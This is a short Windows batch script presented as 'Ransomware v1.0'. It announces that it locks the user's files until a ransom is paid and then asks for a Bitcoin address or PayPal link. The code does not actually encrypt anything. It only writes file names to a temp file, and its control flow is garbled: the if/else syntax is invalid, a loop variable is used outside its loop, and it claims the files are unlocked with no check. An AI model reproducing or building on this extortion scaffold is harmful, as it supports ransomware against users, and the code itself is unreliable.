@echo off
title Ransomware v1.0
color 3F
cls
echo This program is intended to lock your files in a secure way and 
unlock them only after payment of ransom money.
pause
set /p password=Enter your password:
set file_path=%userprofile%
for %%I in (*) do (
 echo %file_path%%I >> temp.txt
 set /a count+=1
 if not exist temp.txt (
 echo Error, files could not be locked. >> temp.txt
 ) else (
 echo Files locked successfully! >> temp.txt
 )
 if "%%I"=="" (
 echo No files selected. >> temp.txt
 ) else (
 for /f %%N in (temp.txt) do set file_path=%%~nxN
 ) else (
 del temp.txt
 )
)
echo Payment details:
echo ---------------------------
set /p bitcoin_address=Enter your Bitcoin address or PayPal link:
echo Your files are now unlocked! >> temp.txt
if not exist temp.txt (
 echo Error, payment could not be processed. >> temp.txt
 ) else (
 set /a count+=1
 if "%%I"=="" (
 echo No files selected. >> temp.txt
 ) else (
 for /f %%N in (temp.txt) do set file_path=%%~nxN
 ) else (
 del temp.txt
 )
 )
if not exist temp.txt (
 exit /b 1
 )
exit /b 0
